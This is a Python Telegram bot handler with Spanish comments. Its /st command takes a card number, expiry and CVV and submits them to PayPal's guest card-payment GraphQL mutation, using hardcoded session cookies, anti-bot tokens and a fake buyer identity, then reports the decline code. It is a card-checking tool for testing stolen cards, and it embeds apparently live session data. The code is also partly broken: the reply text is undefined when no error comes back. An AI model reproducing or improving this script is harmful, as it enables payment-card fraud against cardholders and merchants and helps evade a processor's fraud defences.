from aiogram import Router, types
from aiogram.filters import Command
import requests

router = Router()

@router.message(Command("st"))
async def st_handler(msg: types.Message):
    args = msg.text.split(" ", maxsplit=1)
    if len(args) < 2:
        return await msg.answer(
            "❌ Formato incorrecto.\n"
            "Ejemplo: /st 4111111111111111|12|2026|123"
        )

    try:
        numero, mes, ano, cvv = args[1].strip().split("|")
    except ValueError:
        return await msg.answer(
            "❌ Debes enviar los 4 datos separados por `|`",
            parse_mode="Markdown"
        )

    await msg.answer("🔄 Procesando...")

    try:
        if numero.startswith("5"):
            tipo = "MASTER_CARD"
        elif numero.startswith("4"):
            tipo = "VISA"
        elif numero.startswith("3"):
            tipo = "AMEX"  # o "JCB", según tu lógica
        elif numero.startswith("6"):
            tipo = "DISCOVER"
        else:
            tipo = "UNKNOWN"


        # ------------------ REQ 1: GraphQL mutation payWithCard ------------------
        cookies = {
            'enforce_policy': 'ccpa',
            'cookie_check': 'yes',
            'd_id': 'ab077583653a4cf4b23c51c99dd9255e1747451999479',
            'datadome': 'iYAkUQaQ8z7H0lYZZGu~bt9W8zXuS0Ic5zWZZMRMmRAOt5rjm5l1xpDxZZMDs_pWS7zZJ5w61f9xZ0_0~ywCVw9Bp9g3kUbdM1lYeDaYIIrAA~QxcBFcJz9a6~lEsQFG',
            'nsid': 's%3ADeYReZf8QMjXskwrP24hYROvFhJChZgL.ZKHe6X40dqNDBjl40N0lQrEo3H%2BpvlAUL1nxQAsgdoM',
            'ts_c': 'vr%3D70ae65981940aa5a1023f2a2fe826b6c%26vt%3D509c5f841970a798285cadbbfd2f373e',
            'cookie_prefs': 'T%3D0%2CP%3D1%2CF%3D1%2Ctype%3Dimplicit',
            'l7_az': 'dcg16.slc',
            'LANG': 'en_US%3BUS',
            'rssk': 'd%7DC9%40%3A%3C9592%3A%3E%3B97%3Exqx%3E9wp9pm%7Dq%3F16',
            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'hKLin-hfAWz8cAy4Ain9wxOKflNSrOOlwgMQd89LxKkoWSg6Qven-x_ssl7CjlN-2Ejc2UQk16hBXhlr',
            'ddi': 'EbfWe9YmOuLCOp1C3h3sQl-hMS0RfQcXUGkrs7kcBsfZ8Yu7DnV7v4q4GB8IvgBAA2zcAM6F7wycT3rhLvsuIGB15WD7y7YGUg5D2hdxzj00ysqg',
            'sc_f': 'qihcsYKN-aVZn2i5BF9UEJPof-RywU9De_rJHTFhe60AOGAgazR-8XhxFyh-kox9eRxBCx1RCfxXDwtbhSJ0VTv6k7t_JwFyXz5rpW',
            'ts': 'vreXpYrS%3D1780941295%26vteXpYrS%3D1749407095%26vr%3D70ae65981940aa5a1023f2a2fe826b6c%26vt%3D509c5f841970a798285cadbbfd2f373e%26vtyp%3Dreturn',
            'tsrce': 'standardcardfields',
            'x-pp-s': 'eyJ0IjoiMTc0OTQwNTI5NTgwNCIsImwiOiIwIiwibSI6IjAifQ',
        }

        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
            'content-type': 'application/json',
            # (la línea de cookie va comentada porque ya cargaste cookies aparte)
            # 'cookie': 'enforce_policy=ccpa; cookie_check=yes; d_id=...; ...',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': '8UA0911501956764B',
            'paypal-client-metadata-id': '8UA0911501956764B',
            'referer': (
                'https://www.paypal.com/smart/card-fields?'
                'sessionID=uid_c4deb6989a_mtc6nte6mtk&'
                'buttonSessionID=uid_90427d3405_mtc6ntm6mzi&'
                'locale.x=en_US&commit=true&hasShippingCallback=false&'
                'env=production&country.x=US&sdkMeta='
                'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9lbmFibGUt'
                'ZnVuZGluZz12ZW5tbyZjbGllbnQtaWQ9QVVJbGtrdzY1bUg0b2lmcDZmWGtYd'
                'XNQMXdBNVJybTNsLXNWbnpxRVlacENWUTY0dHdIRENGRlFCRnZCSExwQ09GRHE'
                'za1hRNnhlTHd3djQmY3VycmVuY3k9RVVSJmxvY2FsZT1lbl9VUyZkaXNhYmxl'
                'LWZ1bmRpbmc9Z2lyb3BheSUyQ3NlcGElMkNzb2ZvcnQiLCJhdHRycyI6eyJkYXRh'
                'LXVpZCI6InVpZF9scGh0ZGRreXBsbWlndWlpc29icnBwbHRheXBsbnoifX0&'
                'disable-card=&token=8UA0911501956764B'
            ),
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': (
                'Mozilla/5.0 (Linux; Android 10; K) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/137.0.0.0 Mobile Safari/537.36'
            ),
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }

        query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """

        json_data = {
            'query': query,
            'variables': {
                'token': '8UA0911501956764B',
                'card': {
                    'cardNumber': numero,
                    'type': tipo,
                    'expirationDate': f"{mes}/{ano}",
                    'postalCode': '10010',
                    'securityCode': cvv,
                },
                'phoneNumber': '19008007828',
                'firstName': 'Luis',
                'lastName': 'Pech',
                'billingAddress': {
                    'givenName': 'Luis',
                    'familyName': 'Pech',
                    'line1': None,
                    'line2': None,
                    'city': None,
                    'state': None,
                    'postalCode': '10010',
                    'country': 'US',
                },
                'email': 'asdimandam@gmail.com',
                'currencyConversionType': 'VENDOR',
            },
            'operationName': None,
        }

        response = requests.post(
            'https://www.paypal.com/graphql?fetch_credit_form_submit',
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=30
        )

        # Enviamos al usuario los primeros 400 caracteres de la respuesta
        #texto = response.text
        #resumen = texto[:400] + ("..." if len(texto) > 400 else "")

        resp_json = response.json()

        if "errors" in resp_json:
        
                code = resp_json["errors"][0]["data"][0].get("code", "UNKNOWN")
                message = resp_json["errors"][0].get("message", "UNKNOWN")

                texto = (
                    "PayPal\n"
                    "=≈=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
                    f"❌ *{numero}|{mes}|{ano}|{cvv}*\n"
                    f"*Code:* `{code}`\n"
                    f"*Message:* `{message}`\n"
                    "=≈=≈=≈=≈=≈=≈=≈=≈=≈=≈="
                )

        await msg.answer(texto, parse_mode="Markdown")

    except Exception as e:
        await msg.answer(
            f"❌ Error en el request:\n`{str(e)}`",
            parse_mode="Markdown"
        )
